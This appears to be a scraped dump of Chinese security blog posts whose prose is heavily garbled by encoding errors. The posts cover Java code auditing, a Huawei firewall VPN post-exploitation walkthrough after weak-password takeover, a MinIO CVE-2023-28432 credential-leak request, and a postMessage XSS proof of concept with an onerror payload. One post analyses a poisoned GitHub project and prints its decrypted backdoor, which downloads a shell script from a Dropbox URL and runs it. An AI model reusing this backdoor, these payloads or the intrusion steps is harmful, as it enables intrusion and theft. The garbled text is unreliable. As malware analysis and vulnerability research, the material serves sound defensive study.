åœ¨Javaç¼–ç¨‹è¯­è¨€ä¸­ï¼Œinterfaceå’Œimplementsä¸¤ä¸ªå…³é”®å­—éƒ½è·Ÿé¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ¦‚å¿µæœ‰å¯†åˆ‡çš„å…³ç³»ã€‚ä¸‹é¢æ˜¯å¯¹å®ƒä»¬çš„åŸºç¡€è§£é‡Šï¼š interfaceï¼šåœ¨Javaä¸­ï¼Œæ¥å£ï¼ˆinterfaceï¼‰æ˜¯ä¸€ç§å¼•ç”¨ç±»å‹ï¼Œè·Ÿç±»ï¼ˆclassï¼‰æ˜¯åŒçº§çš„ç»“æ„ã€‚å®ƒæ˜¯ä¸€ç§å®Œå…¨æŠ½è±¡çš„ç±»å‹ï¼Œç”¨äºå®šä¹‰å¯¹è±¡ä¹‹é—´çš„çº¦å®šæˆ–è¡Œä¸ºè§„èŒƒã€‚æ¥å£ä¸­å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•å’Œå¸¸é‡ï¼Œä½†ä¸èƒ½åŒ…å«æ™®é€šæ–¹æ³•ï¼ˆé™¤éæ˜¯Java 8ä¹‹åå¼•å…¥çš„defaultæ–¹æ³•å’Œé™æ€æ–¹æ³•ï¼‰ã€‚å®è´¨ä¸Šï¼Œæ¥å£æ˜¯å¯¹åŠ¨ä½œçš„æŠ½è±¡ã€‚ implementsï¼šè¿™æ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºç±»æ¥&quot;å®ç°&quot;ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ã€‚å½“ä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œå°±æ„å‘³ç€è¿™ä¸ªç±»å¿…é¡»æä¾›æ¥å£ä¸­æ‰€æœ‰æŠ½è±¡æ–¹æ³•çš„å…·ä½“å®ç°ã€‚ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œè¿™å°±æä¾›äº†ä¸€ç§å¯¹äºJavaå•ç»§æ‰¿çš„è¡¥å……æœºåˆ¶ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ¥å£å’Œç±»çš„ç¤ºä¾‹ï¼š interface Animal { void eat(); void sleep(); } class Dog implements Animal { @Override public void eat() { System.out.println(&quot;The dog eats.&quot;); } @Override public void sleep() { System.out.println(&quot;The dog sleeps.&quot;); } public void bark() { System.out.println(&quot;The dog barks.&quot;); } } â€‹ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸ºAnimalçš„æ¥å£ï¼Œæ¥å£æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼šeatå’Œsleepã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç±»Dogï¼Œè¿™ä¸ªç±»é€šè¿‡ä½¿ç”¨å…³é”®å­—implementsæ¥å®ç°äº†Animalæ¥å£ã€‚è¿™å°±æ„å‘³ç€Dogç±»å¿…é¡»æä¾›Animalæ¥å£ä¸­æ‰€æœ‰æ–¹æ³•çš„å®ç°ã€‚ è¯·æ³¨æ„ï¼Œè™½ç„¶Dogç±»å¿…é¡»å®ç°æ‰€æœ‰çš„Animalæ¥å£çš„æ–¹æ³•ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€Dogç±»ä¸èƒ½æœ‰Animalæ¥å£ä¹‹å¤–çš„å…¶ä»–æ–¹æ³•ã€‚ä¾‹å¦‚ï¼ŒDogç±»å¯èƒ½è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œå¦‚ bark()ï¼š åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½ èƒ½å¤Ÿåœ¨Dogå¯¹è±¡ä¸Šè°ƒç”¨bark()æ–¹æ³•ï¼š Dog myDog = new Dog(); myDog.bark(); // The dog barks. ä½†ä½ ä¸èƒ½åœ¨Animalå¯¹è±¡ä¸Šè°ƒç”¨bark()æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸æ˜¯Animalæ¥å£çš„ä¸€éƒ¨åˆ†ï¼š Animal myAnimal = new Dog(); // This is allowed because Dog is a subtype of Animal. myAnimal.bark(); // This is NOT allowed. åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå°½ç®¡myAnimalæ˜¯ä¸€ä¸ªDogçš„å®ä¾‹ï¼Œä½†æ˜¯ç”±äºå…¶ç±»å‹è¢«å£°æ˜ä¸ºAnimalï¼Œæˆ‘ä»¬åªèƒ½è°ƒç”¨åœ¨Animalæ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚å¦‚æœä½ éœ€è¦è°ƒç”¨bark()æ–¹æ³•ï¼Œå°±éœ€è¦å°†å¯¹è±¡ç±»å‹è½¬æ¢æˆDog: Animal myAnimal = new Dog(); // This is allowed because Dog is a subtype of Animal. ((Dog)myAnimal).bark(); // This would be allowed because we are casting myAnimal to Dog. æ€»ä½“è€Œè¨€ï¼Œä½¿ç”¨interfaceå’Œimplementsçš„å…³é”®ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªå¯ä»¥ç”±å¤šç§ç±»æŒ‰ç…§å…±äº«çš„è§„åˆ™è¿›è¡Œå®ç°çš„æ¶æ„ï¼Œè¿™æ ·é€šè¿‡ä½¿ç”¨å¤šæ€æ€§ï¼Œå°±å¯ä»¥ä½¿æˆ‘ä»¬çš„ä»£ç æ›´åŠ çµæ´»å’Œå¯æ‰©å±•ã€‚ 0x02 å®¡è®¡ç›¸å…³ é‚£ä¹ˆå®é™…åœ¨å®¡è®¡ä¸­è¿™ä¸ªåŸºç¡€çŸ¥è¯†åˆæ‰®æ¼”ç€ä»€ä¹ˆè§’è‰²ï¼Œè¿™é‡Œç”¨æŸä¸ªOAçš„æ¼æ´è§¦å‘ç‚¹è·Ÿè¸ªè¿‡ç¨‹è¿›è¡Œä¸¾ä¾‹ã€‚ å½“ä½ æ‰¾åˆ°æ­¤æ¼æ´è·¯å¾„å…³è”çš„è°ƒç”¨æ–¹æ³•ï¼ŒonMessage() ç„¶åä½ æ¯æ¬¡éƒ½åˆ©ç”¨ideaè¿›è¡Œcommand+é¼ æ ‡å·¦é”®è¿›è¡Œè·Ÿè¸ªï¼Œç›´åˆ°è¿½æº¯åˆ°handleMessage()æ–¹æ³•ï¼Œå‘ç°ï¼Œå’¦ï¼Œæ€ä¹ˆæ˜¯ç©ºçš„ è¿™ä¸ªæ—¶å€™å¦‚æœä½ çŸ¥é“interface&amp;implementsçš„å…³ç³»ï¼Œé‚£ä¹ˆä½ å°±ä¼šå»æ‰¾å®ç°WorkspaceMessageHandlerè¿™ä¸ªæ¥å£çš„ç±»äº†ï¼Œä¹ŸçŸ¥é“ä¸ºå•¥è¦æœimplements WorkspaceMessageHandleräº†ï¼ˆå¿«æ·è·³è½¬è§æ–‡å°¾ï¼‰ã€‚ æœ€ç»ˆä½ æˆåŠŸæ‰¾åˆ°äº†æ¼æ´è§¦å‘æ–¹æ³•ï¼Œè€Œä¸æ˜¯åŠè·¯å¤­æŠ˜ã€‚ PS: ideaå³é”®è½¬åˆ°æ¥å£å®ç°ä»£ç ï¼Œå¿«æ·é”®option+command+B ","link":"https://www.svenbeast.com/post/5MkJJ8OB9/"},{"title":"Javaæ‰“åŒ… | æœ€ä¼˜ç¼©å‡jaråŒ…ä½“ç§¯","content":"0x01 â€‹ å‘ç°æœ‰äººå†™äº†å¸†è½¯çš„GUIæ”¾åœ¨githubï¼Œè¯•ç”¨åè§‰å¾—å¾ˆæ–¹ä¾¿ï¼Œé‚ä¸‹è½½åå°è¯•å°†æ–°çš„åˆ©ç”¨é“¾æ·»åŠ è¿›å»ï¼Œä»¥æ–¹ä¾¿åç»­è‡ªå·±æµ‹è¯•ç”¨ï¼Œä½†æ˜¯å°†åˆ©ç”¨é“¾çš„jaråŒ…ä¾èµ–æ·»åŠ è¿›å»åï¼Œæ‰“åŒ…å‡ºæ¥çš„jaråŒ…å¤ªå¤§äº†ï¼Œæœ‰200å¤šmbï¼Œæ‰€ä»¥æƒ³ç¼©å‡ä¸‹ 0x02 â€‹ æœ‰äººè¯´ä¸€ä¸ªä¸€ä¸ªçœ‹ä¾èµ–ç„¶åå»åšé€‚é…ï¼Œè§‰å¾—ä¸å¤ªç°å®ï¼Œæœ€åä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ ä¿®æ”¹ä¾èµ–fine-third-10.0.jarä¸ºfine-third-10.0.zip ä½¿ç”¨MacZip(macçš„å‹ç¼©å·¥å…·ï¼Œå…¶ä»–å‹ç¼©å·¥å…·ä¸å¯ä»¥) ç„¶åé€‰ä¸­ä¸éœ€è¦çš„ä¾èµ–å»ç§»é™¤ï¼Œå®é™…åˆ é™¤ä¸€äº›æ²¡ç”¨åˆ°çš„å¤§ä½“ç§¯çš„æ–‡ä»¶å¤¹å°±å¯ä»¥äº† 0x03 ä¸€å¼€å§‹è®°å¾—ä»¥å‰å¼„è¿‡ï¼Œå°±æ˜¯æ”¹å‹ç¼©åŒ…å»ç¼©å‡ä½“ç§¯ï¼Œå…·ä½“è®°ä¸æ¸…äº†ã€‚ é æ¨¡ç³Šå°è±¡å»å°è¯•ï¼Œå…ˆè¯•è§£å‹åå»åˆ é™¤æ²¡ç”¨çš„ä¾èµ–åœ¨å‹ç¼©ï¼Œä½†æ˜¯è¿™æ ·å‡ºæ¥çš„jaråŒ…ä¸èƒ½ç”¨ï¼Œideaçœ‹ç€æ€»æ˜¯å¤šä¸€å±‚è·¯å¾„ åæ¥æ˜¯è§£å‹åˆ é™¤ä¾èµ–åï¼Œé€‰æ‹©æ‰€æœ‰æ–‡ä»¶å¤¹åå³é”®å‹ç¼©ï¼Œä¸è¿‡è¿™æ ·çš„jaråŒ…è™½ç„¶ä¸å¤šä¸€å±‚è·¯å¾„äº†ï¼Œä½†ä¹Ÿä¸èƒ½ç”¨ æœ€ç»ˆæ•ˆæœ ç®€å•å®ç”¨ï¼Œ200å¤šmb =&gt; 40mbï¼Œé¡ºä¾¿æ ‡é¢˜æ”¹æˆè‡ªå·±çš„IDï¼Œå“ˆå“ˆå“ˆï¼Œæ„Ÿè°¢yecp181çš„æºç  ","link":"https://www.svenbeast.com/post/Zvdet8GNt/"},{"title":"ååˆ©ç”¨ | HUAWEIé˜²ç«å¢™VPNéš§é“åˆ©ç”¨","content":"é€šè¿‡å¼±å£ä»¤æ‹¿åˆ°åä¸ºé˜²ç«å¢™çš„ç®¡ç†æƒé™æˆ–å…¶ä»–åœºæ™¯æ‹¿åˆ°ç®¡ç†æƒé™ï¼Œåç»­å¦‚ä¸‹ 1.æ–°å»ºVPN 2.é€‰æ‹©LNSç±»å‹ï¼Œè¾“å…¥ä¸€äº›è¾“å…¥é¡¹ï¼Œç„¶åæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œè®°ä½è¿™é‡Œè®¾ç½®çš„å¯¹ç«¯éš§é“åç§°ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶è¦ç”¨åˆ° 3.è¾“å…¥åœ°å€è®¾ç½®ï¼Œè¿™é‡Œçš„IPåœ°å€è‡ªç”±è®¾ç½®ï¼Œåªè¦ä¸å’Œæ­¤é˜²ç«å¢™è®¾å¤‡çš„IPåœ¨åŒä¸€ç½‘æ®µå³å¯ 4.å®‰è£…HUAWEI SecoClientå®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ æˆ‘æ˜¯Macï¼Œæ‰¾äº†ä¸‹èµ„æºï¼Œwinçš„å’Œmacçš„å®‰è£…åŒ…éƒ½å­˜åœ¨ç™¾åº¦äº‘äº† é“¾æ¥: https://pan.baidu.com/s/1lb1RczQuvVWeP5Pr1TwuFQ æå–ç : sven 5.è¾“å…¥è®¾ç½®çš„ä¿¡æ¯ï¼ŒLNSæœåŠ¡å™¨åœ°å€å°±æ˜¯é˜²ç«å¢™IPåœ°å€ï¼ŒPAPæ¨¡å¼ï¼Œå¦‚æœè®¾ç½®äº†éš§é“å¯†ç å°±å¯ç”¨éš§é“éªŒè¯åŠŸèƒ½ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ï¼Œæ‰€ä»¥å¼€å¯ï¼Œéš§é“åç§°å¡«åˆšæ‰æ–°å»ºéš§é“çš„å¯¹ç«¯éš§é“åç§°ï¼Œå¦‚æœä¸å¯¹åº”æ˜¯è¿ä¸ä¸Šçš„ 6.ä½¿ç”¨è®¾ç½®çš„ç”¨æˆ·å¯†ç è¿›è¡Œç™»å½•ï¼Œè¿æ¥æˆåŠŸï¼Œè¿™æ—¶è¿æ¥åå½“å‰ç”µè„‘ä¹Ÿå°±æ— æ³•ä¸Šç½‘äº† 7.ç»æµ‹è¯•ï¼Œä¿®æ”¹è¿æ¥é…ç½®ä¸ºå…è®¸è¿æ¥åè”ç½‘ï¼Œå¹¶è®¾ç½®å¥½å†…ç½‘IPæ®µ(åœ¨é˜²ç«å¢™è·¯ç”±è¡¨æˆ–å…¶ä»–é…ç½®ä¸­å¯çœ‹åˆ°ç›¸å…³å†…ç½‘ç½‘æ®µ)ï¼Œè¿™æ ·å°±å¯ä»¥é€šå†…ç½‘èµ„äº§äº†ï¼Œä¸è¿™æ ·è®¾ç½®æˆ‘è¿™é‡Œä¼šå¯¼è‡´pingä»»æ„ç½‘æ®µéƒ½æ˜¯é€šçš„ï¼ˆå®é™…ä½¿ç”¨æ—¶ï¼Œéœ€è‡ªè¡Œæµ‹è¯•æ˜¯å¦éœ€è¦æ­¤æ­¥éª¤ï¼‰ ","link":"https://www.svenbeast.com/post/khfIrl-fh/"},{"title":"MinIOæœªæˆæƒä¿¡æ¯æ³„éœ²ï¼ˆCVE-2023-28432ï¼‰","content":"æ¼æ´èŒƒå›´ RELEASE.2019-12-17T23-16-33Z &lt;= version &lt; MinIO RELEASE.2023-03-20T20-16-18Z minioç¯å¢ƒ version: '3.7' # starts 4 docker containers running minio server instances. Each # minio server's web interface will be accessible on the host at port # 9001 through 9004. services: minio1: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio1 volumes: - data1-1:/data1 - data1-2:/data2 ports: - &quot;9001:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio2: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio2 volumes: - data2-1:/data1 - data2-2:/data2 ports: - &quot;9002:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio3: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio3 volumes: - data3-1:/data1 - data3-2:/data2 ports: - &quot;9003:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 minio4: image: minio/minio:RELEASE.2023-01-31T02-24-19Z container_name: minio4 volumes: - data4-1:/data1 - data4-2:/data2 ports: - &quot;9004:9000&quot; environment: MINIO_ACCESS_KEY: minio MINIO_SECRET_KEY: minio123 command: server http://minio{1...4}/data{1...2} healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;] interval: 30s timeout: 20s retries: 3 ## By default this config uses default local driver, ## For custom volumes replace with volume driver configuration. volumes: data1-1: data1-2: data2-1: data2-2: data3-1: data3-2: data4-1: data4-2: å¯åŠ¨ç¯å¢ƒ docker-compose -f docker-compose.yml up è·å–å‡­æ® POST /minio/bootstrap/v1/verify HTTP/1.1 Host: 192.168.0.113:9001 Content-Length: 0 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://127.0.0.1:9001 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://127.0.0.1:9001/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close PSï¼šåŒ…å«æœ¬æ¬¡å…¶ä»–æ¼æ´çš„è”åˆåˆ©ç”¨è¿˜æœ‰å¾…ç ”ç©¶ ","link":"https://www.svenbeast.com/post/_sKzg-nS0/"},{"title":"XSSæ¼æ´ | postMessageç±»å‹ç¬”è®°","content":"0x01 postMessageæ˜¯what? postMessage API æ˜¯åœ¨ HTML5 ä¸­å¼•å…¥çš„é€šä¿¡æ–¹æ³•ï¼Œå¯ä»¥åœ¨æ ‡ç­¾ä¸­å®ç°è·¨åŸŸé€šä¿¡ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªç½‘é¡µçª—å£è¿›è¡Œé€šä¿¡çš„æ–¹æ³•ã€‚ 0x02 å¦‚ä½•å·¥ä½œ Aé¡µé¢: ä¸€ä¸ªå¸¦æœ‰ æ¥æ”¶postMessagesé€šä¿¡çš„æµ‹è¯•htmlç½‘é¡µ ==&gt; ç›¸ç­‰äºä¸€ä¸ªæ­£å¸¸ç½‘ç«™é¡µé¢ &lt;!-- å‡å¦‚è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸ç³»ç»Ÿçš„.html --&gt; &lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt; &lt;div id=&quot;receiveMessage&quot;&gt; Hello World! &lt;/div&gt; &lt;script&gt; var test = &quot;flag{123456}&quot;; window.onload = function() { window.addEventListener('message', function (e) { // ç›‘å¬ message äº‹ä»¶ // alert(e.origin); document.getElementById('receiveMessage').innerHTML = &quot;ä»&quot;+ e.origin +&quot;æ”¶åˆ°æ¶ˆæ¯ï¼š &quot; + e.data; }); } &lt;/script&gt; Bé¡µé¢: ä¸€ä¸ªå¸¦æœ‰ ä½¿ç”¨postMessageså‘é€é€šä¿¡çš„æµ‹è¯•htmlç½‘é¡µ ==&gt; ç›¸ç­‰äºä¸€ä¸ªæ”»å‡»é¡µé¢ &lt;!-- POC.html --&gt; &lt;title&gt;Postmessage PoC&lt;/title&gt; &lt;script&gt; function pocFrame(win) { let msg = &quot;hello world!&quot;; win.postMessage(msg, '*'); } &lt;/script&gt; &lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt; æ­£å¸¸çš„è¿è¡Œæµç¨‹ Aé¡µé¢æŒç»­ç›‘å¬é€šä¿¡ï¼Œå½“è®¿é—®Bé¡µé¢çš„æ—¶å€™è¿è¡Œjsä»£ç ï¼Œå‘Aé¡µé¢å‘é€é€šä¿¡ï¼ŒAé¡µé¢æ¥å—ä¿¡æ¯ç„¶åå¯¹æ¥å—å†…å®¹è¿›è¡Œå¤„ç† åº”ç”¨åœºæ™¯: ä¸€ä¸ªç½‘ç«™å®æ—¶ç›‘å¬ï¼Œå¦ä¸€ä¸ªç½‘é¡µæŸé¡¹è¿è¡Œæµç¨‹ç»“æŸåå‘é€è¿›åº¦é€šçŸ¥åˆ°ç›‘å¬çš„ç½‘é¡µï¼Œåç»­å¦‚ä½•xxx... 0x03 å¦‚ä½•å˜æˆæ¼æ´ æºå¸¦payloadçš„poc.html &lt;!-- POC.html --&gt; &lt;title&gt;Postmessage PoC&lt;/title&gt; &lt;script&gt; function pocFrame(win) { let msg = &quot;hello world! &lt;img src=x onerror=alert(test)&gt;&quot;; win.postMessage(msg, '*'); } &lt;/script&gt; &lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt; äº§ç”Ÿæ¼æ´åŸå›  æ¶ˆæ¯æ¥æ”¶æ–¹æ²¡æœ‰å¯¹å‘é€æ–¹çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œå¯¼è‡´å¯ä»¥è‡ªå®šä¹‰å‘é€æ–¹ç½‘é¡µ ä¾‹å¦‚: if (e.origin !== &quot;https://www.freebuf.com&quot;) æ¶ˆæ¯æ¥æ”¶æ–¹å¯¹å‘é€æ–¹å‘é€çš„å†…å®¹è¿›è¡Œäº†å±•ç¤ºå¤„ç†ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨XSS payloadè¿›è¡Œæˆªæ–­ ä¾‹å¦‚: document.getElementById('receiveMessage').innerHTML = &quot;ä»&quot;+ e.origin +&quot;æ”¶åˆ°æ¶ˆæ¯ï¼š &quot; + e.data; åˆ©ç”¨è¿‡ç¨‹ å’Œåå°„å‹xssç±»ä¼¼ï¼Œç”¨æˆ·åœ¨è®¿é—®ç›®æ ‡ç½‘ç«™çš„æ—¶å€™ï¼Œæ‰“å¼€äº†æ”»å‡»è€…æä¾›çš„urlï¼Œurlæ˜¯æºå¸¦xss payloadçš„poc.htmlï¼Œå¯¼è‡´åœ¨ç›®æ ‡ç½‘ç«™æ‰§è¡Œäº†jsä»£ç ã€‚ å…¶ä»–å½¢å¼æ¼æ´ ä¸Šé¢å±•ç¤ºçš„æ˜¯æ¥æ”¶æ–¹æ²¡æœ‰å¯¹å‘é€èº«ä»½éªŒè¯ï¼Œåœ¨å¯¹æ¥æ”¶çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†åè¢«xss payloadæˆªæ–­å¯¼è‡´å­˜åœ¨xssæ¼æ´ æ¥æ”¶æ–¹æ˜¯æ­£å¸¸ç³»ç»Ÿ =&gt; å‘é€æ–¹æ˜¯æ¶æ„html é‚£ä¹ˆè¿™æ ·å°±è¿˜ä¼šæœ‰å¦å¤–ä¸€ç§å½¢å¼çš„æ¼æ´ï¼Œå‘é€æ–¹æ²¡æœ‰è®¾ç½®æ¥æ”¶æ–¹çš„èº«ä»½ï¼Œä¾‹å¦‚ xxx.postMessage(msg,'*'); *å·ä»£è¡¨å¯¹æ¥æ”¶æ–¹çš„çª—å£æ²¡æœ‰é™åˆ¶ï¼Œåªè¦ä½ è®¾ç½®äº†ç›‘å¬(addEventListener)éƒ½å¯ä»¥æ¥æ”¶åˆ°ï¼Œé‚£ä¹ˆå¦‚æœæ­£å¸¸ç³»ç»Ÿåœ¨å‘é€çš„æ—¶å€™å°±æ˜¯å¦‚æ­¤è®¾ç½®ï¼Œè€Œåˆšå¥½å‘é€å†…å®¹æ˜¯ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯ï¼Œå¦‚è´¦å·å¯†ç çš„hashï¼Œé‚£ä¹ˆä½ é€šè¿‡è®¾ç½®äº†ç›‘å¬å½“åšæ¥æ”¶æ–¹çš„æ¶æ„htmlï¼Œç”¨æˆ·æµè§ˆæ­£å¸¸ç³»ç»Ÿæ—¶ï¼Œç„¶ååœ¨æ‰“å¼€ä½ çš„htmlåä½ å°±å¯ä»¥è·å¾—å…¶æ­£å¸¸ç½‘ç«™çš„å‘é€å†…å®¹ å‘é€æ–¹æ˜¯æ­£å¸¸ç³»ç»Ÿ =&gt; æ¥æ”¶æ–¹æ˜¯æ¶æ„html 0x04 æŒ–æ˜æ–¹æ³• é€šè¿‡postMessageæ–¹æ³•çš„å…³é”®å­—è¿›è¡Œå®šä½åŠŸèƒ½ç‚¹ï¼Œé€šè¿‡debugä»£ç å¯»æ‰¾è§¦å‘ç‚¹ï¼Œä»è€Œè·å¾—æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨burpçš„æ’ä»¶J2EEScanè¾…åŠ©å¯»æ‰¾ä½¿ç”¨ç›¸åº”åŠŸèƒ½çš„jsæ–‡ä»¶ï¼Œå¦‚ä½•æ‰©å±•å»¶ä¼¸çš„è¿›è¡ŒæŒ–æ˜å¯¹äºæˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªæœ‰å¾…å¼€å‘çš„è¿‡ç¨‹ï¼Œç›®å‰æˆ‘æœ¬äººå¯¹æ­¤æ¼æ´çš„ç»éªŒå¹¶ä¸è¶³ä»¥å¸®æˆ‘æ‰¾åˆ°æ›´å¥½çš„è‡ªåŠ¨åŒ–æŒ–æ˜åŠæ³•ingï¼Œ ","link":"https://www.svenbeast.com/post/o2xpyWshj/"},{"title":"é’ˆå¯¹\"çº¢é˜Ÿäººå‘˜\"çš„Githubé¡¹ç›®æŠ•æ¯’å‘ç°åŠåˆ†æ","content":"0x01 å‘ç°èƒŒæ™¯ &quot;é˜³åº·&quot;ååœ¨githubé—²é€›æ—¶å‘ç°åŒäº‹staräº†ä¸€ä¸ªåå¤„ç†å…æ€é¡¹ç›®ï¼Œçœ‹æè¿°è¯´å¯ä»¥ç»•è¿‡ä»»ä½•ç±»å‹çš„é˜²ç—…æ¯’äº§å“ï¼Œè‡ªç„¶æˆ‘ä¹Ÿå¯¹é¡¹ç›®äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œé‚å¼€å§‹æŸ¥çœ‹é¡¹ç›®ä»£ç å¹¶ç”±æ­¤å¼€å¯äº†æœ¬æ¬¡çš„æŠ•æ¯’é¡¹ç›®åˆ†æã€‚ PSï¼šæ­¤å‰å¹¶æœªåœ¨å…¶ä»–æ¸ é“å‘ç°æœ¬æ¬¡åˆ†æé¡¹ç›®çš„é¢„è­¦ 0x02 åˆ†æè¿‡ç¨‹ 2.1 é¡¹ç›®åœ°å€ æ–‡ç« ç¼–å†™æ—¶é¡¹ç›®è¿˜åœ¨æ­£å¸¸è¿è¡Œï¼Œæˆ‘å°†å…¶ä¿å­˜åœ¨äº†å¿«ç…§ç½‘ç«™ï¼Œè‹¥åé¢é¡¹ç›®åˆ é™¤æ–¹ä¾¿ç»§ç»­æŸ¥çœ‹ https://github.com/machine1337/pycrypt https://web.archive.org/web/20230103031922/https://github.com/machine1337/pycrypt 2.2 å‘ç°å¼‚å¸¸ é¡¹ç›®çš„ä»‹ç»è¾ƒé•¿ä¸”é™„å¸¦è§†é¢‘ï¼Œæ•´ä½“å¹¶æ— å¼‚å¸¸ï¼Œåœ¨æŸ¥çœ‹ä»£ç å‡†å¤‡äº†è§£å®ç°åŸç†æ—¶å‘ç°å¼‚å¸¸ï¼Œå…¶å¯¼å…¥äº†ä¸€ä¸ªå¼‚å¸¸çš„ä¾èµ–åº“colouremaï¼Œæœ‰ä¸€äº›PYä»£ç ç¼–å†™åŸºç¡€çš„æœ‹å‹åº”è¯¥çŸ¥é“ä¿®æ”¹ç»ˆç«¯é¢œè‰²çš„ä¾èµ–åº“å«åšcoloramaï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾è¿™é‡Œå¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ 2.3 å®šä½åé—¨ åœ¨pypiçš„ä¾èµ–åº“ä»‹ç»ä¸­ï¼Œcolouremaçš„ä»‹ç»æœ‰3000+star,å®é™…é“¾æ¥å´ä¸ºcoloramaï¼Œåˆ°æ­¤ç¡®å®šæ­¤ä¾èµ–åº“å­˜åœ¨åé—¨ã€‚ é€šè¿‡å¯¹ä¾èµ–åº“ä»£ç è¿›è¡ŒæŸ¥çœ‹ï¼Œå› æ‹…å¿ƒä½¿ç”¨vscodeå­˜åœ¨ä¸€äº›é£é™©ï¼Œä½¿ç”¨sublimeæ‰“å¼€ï¼Œæœ€åäºinitialise.pyæ–‡ä»¶ä¸­å‘ç°åé—¨ä»£ç  2.4 åé—¨ä»£ç  2.4.1 ä¸€å±‚åŠ å¯† åŠ å¯†ä»£ç  è§£å¯†åä»£ç  import os,platform,subprocess if platform.system().startswith(&quot;Linux&quot;): try: with open('/tmp/file.py', 'w') as f: f.write(&quot;import os \\nimport subprocess \\nfrom pathlib import Path \\nfrom urllib import request \\nhello = os.getlogin() \\nPATH = '/home/' + hello + '/.msfdb/update'\\nPAT = '/tmp/file.py'\\nisExist = os.path.exists(PATH) \\nif not isExist:\\n os.makedirs(PATH) \\nif Path(PATH).is_file(): \\n print(&quot;&quot;) \\nelse: \\n&quot;) f.write(&quot; remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh'\\n local_file = PATH+'/.path.sh' \\n request.urlretrieve(remote_url, local_file) \\n subprocess.call(\\&quot;bash /home/$USER/.msfdb/update/.path.sh &gt;/dev/null 2&gt;&amp;1\\&quot;, shell=True) \\n&quot;) f.write(&quot; if Path(PAT).is_file(): \\n try:\\n os.remove(PAT)\\n except:\\n print()&quot;) except FileNotFoundError: print(&quot;&quot;) subprocess.call(&quot;python3 /tmp/file.py &amp;&quot;, shell=True) 2.4.2 äºŒå±‚åŠ å¯† ä¸Šé¢ä»£ç ä¸‹è½½å¹¶è¿è¡Œäº†æ­¤é“¾æ¥çš„shæ–‡ä»¶ï¼ŒåŒæ ·ä¿å­˜åœ¨äº†web.archive.orgä¸­ï¼Œåç»­çš„ç›¸å…³æ–‡ä»¶ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ–¹ä¾¿åç»­å…¶ä»–æ„Ÿå…´è¶£çš„å¸ˆå‚…å¤æŸ¥ #shæ–‡ä»¶ä¸­ç»§ç»­ä¸­è½¬å‘ç°ä¸€å±‚åŠ å¯† https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh 